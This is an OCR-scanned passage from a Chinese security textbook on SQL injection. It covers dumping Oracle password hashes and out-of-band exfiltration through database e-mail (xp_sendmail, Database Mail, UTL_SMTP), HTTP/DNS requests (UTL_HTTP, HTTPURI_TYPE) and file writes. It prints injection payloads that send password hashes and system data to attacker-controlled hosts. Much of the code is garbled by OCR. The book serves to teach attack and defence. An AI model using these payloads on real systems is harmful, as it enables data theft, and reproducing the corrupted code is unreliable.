第4章利用SQL注入
(b.attrval, instr (b.attrval, *)′) +1)))) hash
from ods.ct_cn a, ods.ds_attrstore b
vhere a.entryid=b.entryid
and lower (b.attrname) in (
'userpassword', 'orclprpassword', *orclgupassword','orclsslwalletpasswd',
'authpassword',.orclpassvord′)
and substr (b.attrval, 2, instr (b.attrval, *)*) 2) =*MD5 *
order by method, ssouser;
select a.attrvalue ssouser, substr (b.attrval,2,instr (b.attrval, *) *) -2)
method, rawtohex (ut1_encode.base64_decode (ut1_rav.cast_to_raw(substr
(b.attrval, instr (b.attrval, *)*) +1) ))) hash
from ods.ct_cn a,ods.ds_attrstore b
where a,entryid=b.entryid
and lower(b,attrname) in (
'userpassword′, 'orclprpassord', 'orclgupassword', *orclsslwalletpasswd',
'authpassword', *orclpassvord′)
and substr (b.attrva1, 2, instr (b.attrva1, *)′) 2) =′SHA'
order by method, ssouser;
此外，可从下列站点获取一些破解Oracle口令的细节信息及部分工具：
●www.red-database-security.com/whitepaper/oracle_passswords.html
www.red-database-security.com/softwarc/chcck.html
·
www.evilfingers.com/tools/GSAuditor.php ( F载 GSAuditor)
●www.soonerorlater.hu/index.khtml?article_id513 ( F $ woraauthbf)
4.10带外通信
本章介绍的各种不同的漏洞利用技术在利用方法和期望结果上各有不同，但有一点是相同
的：查询及返国结果始终在同一信道上传输。换句话说，用于发送请求的HTTP(S）连接也被用
于接收响应。不过也有例外的情况：可以通过完全不同的信道来传输结果。我们称这样的通信
为“带外”，或简称为OOB（OutOf Band)。这里要明确一点：现代数据库服务器都是功能强大
的应用软件，除了将数据返回给执行查询的用户外，它们还有很多其他功能。例如，如果它们
需要位于其他数据库上的一些信息，那么它们便会打开一个连接来检索这些数据。当发生特定
的事件时，它们还可以执行发送e-mail的指令。它们可以与文件系统交互，所有这些功能都对
攻击者非常有用。事实证明，当无法在正常的HTTP通信中直接获取查询结果时，这些功能有
时是最好的利用SQL注入漏洞的方法。有时并非所有用户都能使用这些功能。不过我们已经
看到，权限提升已不再只是理论上的可能。
根据后台配置及所使用技术的不同，可选用多种方法来使用OOB通信传输数据。本节我
们将介绍儿种技术（第5章专门介绍SQL盲注时会介绍更多内容），不过这些例子无法覆盖所有
的可能情况。因此，如果无法使用正常的HTTP连接提取数据，而且执行查询的数据库用户具
有足够的权限，那么就请发挥创造性：OOB通信可以是成功利用易受攻击应用的最快方法。
4.10.1e-mail
数据库通常是整个架构中最重要的部分。正是出于这个原因，当出现任何问题时，数据库
169
---
## Page 184
SQL注入攻击与防御（第2版）
管理员都需要能迅速做出反应。这一点非常重要。这也是大多数现代数据库服务器均提供某种
e-mail功能的原因。通过该功能，可以在出现特定情况时自动发送、接收e-mail消息以进行响
应。例如，如果将一个新的应用用户添加到了公司的profile中，那么公司管理员便会收到一封
自动发送的e-mail作为安全防范措施。这里我们已经对如何发送e-mail进行了配置。攻击者需
要做的是构造一种利用，通过它来提取想要的信息、将数据打包到e-mail中并使用专门的数据
库函数插入到e-mail队列中，之后该e-mail就会出现在攻击者的邮箱中。
1. Microsoft SQL Server
大多数情况下，Microsoft SQLServer提供了一种很好的内置功能来发送e-mail。事实上，
根据SQLServer版本的不同，存在不止一种而是两种不同的e-mail子系统：SQLMail(SQL
Server 2000、2005 和I 2008)和1 Database Mail(SQL Server 2005 和I 2008)。
SQL Mail是SQL Server 最初的e-mail发送系统。Microsoft 发布 SQL Server 2008 时，宣布
不再提倡该功能，并将在以后的版本中移除。SQL Mail使用了 MAPI(Messaging Application
Programming Interface，消息应用编程接口)，因此需要在 SQL Server 机器上包含一个MAPI 消
息子系统（例如，Microsof Outlook，不是Outlook Express）来发送e-mail。进一步讲，需要使用
POP3/SMTP(Post Office Protocol 3/Simple Mail Transfer Protocol,邮件处理协议 3/简 单邮件传输
协议）或连接到的Exchange服务器（包含连接时使用的账户）来对e-mail客户端进行配置。如果
要攻击的服务器运行着已经配置过的SQLMail，那么只需尝试xp_startmail(启动SQL客户端并
xp_startmail接收两个可选参数（@user和@password)，用于指定所使用的MAPI profile。而在实
际的利用场景中基本不可能得到这些信息，而且根本用不着它们：如果不提供参数，xp_startmail
会尝试使用Microsoft Outlook的默认账户（配置SQLMail以便自动发送e-mail消息时通常使用
该账户)。xp_sendmail的语法如下所示（只展示了一些最相关的选项）：
xp_sendmai1 ( [ @recipients= ] *recipients [1..-n ]* )[, [ @message= ]
'message')
[, [@query= ]*query']
[[ @subject= ] 'subject* ]
不难发现，使用起来相当简单。接下来可注入一种如下所示的查询：
EXEC master..xp_startmail;
EXEC master.,xp_sendmai1 @recipients - *admingattacker.com′, @query
=′select 8@version*
我们将会以 Base64格式收到该e-mail，可通过 Burp Suite 等工具很轻易地对其解码。使用
Basc64意味着还可以传输二进制数据。
甚至可以使用xp_sendmail来检索任意文件，只需在@attachment变量中指定这些文件即
可。不过请记住，默认情况下只有管理员组的成员才能启用xp_scendmail。
要想了解关于xp_sendmail扩展存储过程的更多信息，请参考http://msdn.microsof.com/en-
us/libarary/ms189505.aspx;要想获取关于 xp_startmail 的完整描述，请访问 http://msdn.microsoft.
com/en-us/libarary/ms188392.aspx.
如果xp_scndmail失效且我们的攻击目标是SQLServer2005或2008，那么请不要担心：
170
---
## Page 185
第4章利用SQL注入
从 SQLServer 2005 开始，Microsof引I入了一种新的c-mail子系统，称为Database Mail。相比
SQLMail，Database Mail的主要优点是：它使用了标准SMTP，不需要借助Outlook 这样的
MAPI客户端就能工作。要想成功发送e-mail，必须至少存在一个 Database Mail profile，profile
是Database Mail账户的一个集合。进一步讲，用户必须是DatabascMailUserRole 组的成员，而
且至少能访间一个 Database Mail profile
要想启用Database Mail，使用 sp_configure 就足够了。但要真正发送e-mail，还需要使用
sp_send_dbmail，它相当于 SQL Mail 中的 xp_sendmail.其语法(只包含了最重要的参数)如下
所示：
sp_send_dbmai1 [ [ @profile_name =]*profile_name′ 1[, [ @recipients =
1'recipients [; ...n ]' ]
[, [ @subject - ] 'subject′ ]
[, [ @body = ]*body* ]
[, [ efile_attachments = ] 'attachment [: ...n ]* ]
[, [ @query = ] *query* ]
[, [ @execute_query_database - ] *execute_query_database* ]
profile_name 表示发送e-mail时使用的 profile。如果为空，那么将使用 msdb 数据库默认的
公共profile。如果profile不存在，可以通过下列步骤创建一个：
（1）使用msdb..sysmail_add_accoun_sp创建一个Database Mail。您需要知道一个有效的
SMTP服务器，远程数据库可联系到它并可通过它发送e-mail。该SMTP服务器可以是Intemet
上的某台服务器，也可以是一台攻击者控制之下的服务器。如果数据库服务器能够通过端口25
联系到任何IP地址，就可以使用多种比e-mail更快的方法来提取数据（例如，使用端口 25上
的OPENROESET，我们将在稍后介绍该内容)。所以，如果需要使用e-mail技术，那么可能是
因为数据库服务器无法访问外部主机，这时您需要知道一台有效的位于目标网络上的SMTP服
务器的IP地址。这个过程比想象中的要容易。如果Web应用包含一些发送e-mail消息的功能
（例如，发送用户某些操作的结果或者发送一封重置用户口令的e-mail)，那么SMTP服务器使
很可能出现在e-mail的头中。此外，向一个不存在的接收者发送一封e-mail也可能会触发一个
包含相同信息的响应。不过，如果SMTP服务器有验证功能，那么上述信息是不够的。对于这
种情况，您需要有效的用户名和口令以成功创建一个DatabaseMail账户。
(2) 使用 msdb.sysmail_add_profile_sp 包建个 Database Mail profile。
(3）使用msdb.sysmail_add_profile accoumr_sp将步骤(1)中创建的账户添加至步骤(2)创建
的 profile 中。
(4）使用msdb..sysmail_add_principalprofile_sp为 msdb数据库中的用户授予权限，以访间
所创建的 profile。
http://msdn.microsoft.com/en-us/libarary/ms187605(SQL.90).aspx上详细介绍了 上述过程并附
带了一些示例。如果一切顺利且拥有一个有效的 Database Mail账户的话，最后便可以运行查
询并通过e-mail来发送结果了。下面的示例演示了整个过程：
--Enable Database Ma11
f',paoueape moqs, oxnbtguoode axa
RECONFIGURE;
EXEC sp_configure *Database Mai1l XPs′, 1/
RECONFIGURE
171
---
## Page 186
SQL注入攻击与防御（第2版）
--Create a new account, MYACC. The SMT? server is provided in this cal1.
EXEC msdb, dbo,sysmai1_add_account_sp@account_name='MYACC', @emai1_
address=*hackedevictim. com*,
Bdisplay_name='mls', @mal1server_name=*smtp victim. com',
Baccount_id=NULL;
--Create a new profile, MYPROFILE
EXEC msdb.dbo,sysmai1_add_profile_speprofile_name='xrPROFILE*,@
description=NULL, @profile_id=NULL;
--Bind the account to the profile
EXEC msdb.dbo.sysmai1_add_profileaccount_sp @profile_name=*MYPROFILE*, 8
account_name=′acc′, 8sequence_number=1
--Retrieve login
DECLARE @b VARCHAR (8000) :
SELECT @b=SYSTEM_USER;
--Send the mai1
EXEC msdb .dbo sp_send_dbmai1 @profile_name=*MYPROFILE′, @
recipients='allyrbase@attacker,com′, @subject=′system user′, @
fqe=fpoq
2. Oracle
使用数据库服务器发送e-mail消息时，根据数据库服务器版本的不同，Oracle提供了两种
不同的e-mail发送系统。对于8i及之后的版本，可通过UTL_SMTP包来发送e-mail，UTL_SMTP
包为DBA提供了启动并管理SMTP连接的所有指令。从10g开始，Oracle引入了UTL_MAIL
包。它是位于UTL_SMTP之上的一个附加层，允许管理员快速、简单地使用e-mail发送功能。
正如名称所暗示的，UTL_SMTP提供了一系列函数来启动并管理一个SMTP连接：先使
用UTL_SMTP.OPEN_CONNECTION与服务器取得联系，之后使用UTL_SMTP.HELLO向服
务器发送“HELLO”消息，接着分别使用UTL_SMTP.MAIL和UTL_SMTP.RCP指定发送者和
接收者，接下来使用UTL_SMTP.DATA指定消息，最后使用UTL_SMTPQUIT终止会话。
对于UTL_MAIL来说，整个过程更加简单。可以使用下列存储过程将其作为一个整体来
实现：
UTL_MAIL.SEND (sender, recipient, cc, bcc, subject, message, mime_type, priority )
请记住，出于显而易见的安全原因，默认情况下并未启用UTL_MAIL，管理员必须手动启
用它。不过UTL_SMTP默认是启用的，并授权给了公共角色。
4.10.2 HTTP/DNS
Oracle还提供了两种执行HTTP请求的方法：UTL_HTTP 和 HTTPURI_TYPE。UTL_HTTP
包和HTTPURI_TYPE对象类型默认授权给了公共角色，可以由数据库所有用户执行或通过
SQL注入加以执行。
例如，要想向远程系统发送SYS用户的哈希口令，可注入下列字符串：
or 1=ut1_http.request ('http://www.orasploit,com/′I1(select password
from dba_users where rownum=1))
也可以借助于HTTPURI_TYPE对象类型，如下所示：
172
---
## Page 187
第4章利用SQL注入
or 1=HTrPURI_TYPE('http://www.ora8ploit.com/*I1 (select password from
dba_users where rownum=1) ) -getclob () --
此外，如果SQL查询写在URL内部，那么还可以通过域名系统(DomainNameSystem
DNS)查询来发送数据（最大为64字节)。该查询作用于外部站点（我们将在第5章详细讨论该技
术），如下所示：
or 1= ut1_http.request (*http://www.*11(selectpasswordfromdba_
userswhererownum=l) 11' .orasploit.com/*) --
4.10.3文件系统
有时，Web服务器和数据库服务器恰好位于同一台机器上。当Web应用的用户数量有限，
或者只使用了有限数量的数据时，便会经常出现这种情况。对于这种情况来说，将架构分为多
层并不能降低成本。因此将Web服务器和数据库服务器放在同一台硬件服务器上，对于希望
费用最小化的组织来说很有吸引力，但它却存在很多安全缺陷。其中最明显的是：攻击者只需
利用其中的一种漏洞就足以获取对所有组件的完全控制权。
一旦发现一个SQL注入缺陷，这种安装方式就将会为攻击者提供一种简单便捷的途径来
帮助他们从数据库服务器提取信息。如果攻击者拥有足够的写文件系统的权限，那么他就可以
将查询结果重定向到Web服务器根目录下的一个文件中，之后他便可以使用浏览器来正常访
问该文件。
即便数据库服务器和Web服务器位于不同的机器上，但如果将Web服务器配置成允许导
出那些包含Web站点的文件夹并且数据库拥有写这些文件的权限，那么仍然可以采用上述技术。
请注意，第6章会介绍与文件系统交互的更多知识。
1. SQL Server
对于MicrosofSQLServer米说，有多种方法可用于将信息重定向到文件系统。如果用户
拥有进行该项操作的权限，那么最好的方法将取决于面对的数据类型和数量。有时可能需要导
出一个简单的文本行，比如像@@version这样的内置变量的值。从数据库提取数据后将其放到
单个文本值中时也会碰到这种情况。比如下列代码（适用于SQLServer2005)中的@hash变量，
它检索sql_logins表中第一个用户的用户名和哈希：
declare @hash nvarchar (1000)
select top 1 @hash = name + ' I ' +master.dbo.fn_
varbintohexstr (password_hash) from sys,sql_logins
对于这种情况，要将该值重定向到文件系统的一个文本文件中非常容易，只需注入下列代
码即可：
-- Declare needed variables
DECLARE @a int, Chash nvarchar (10o), Bfileid int;
-- Take the username and password hash of the first user in sql_logins
-- and store it into the variable @hash
SELECT top 1 @hash = name + ' I ' +master,dbo.fn_
varbintohexstr (password_hash) FROM sys.sql_logins,
-- Create a FileSystemObject pointing to the location of the desired file
173
---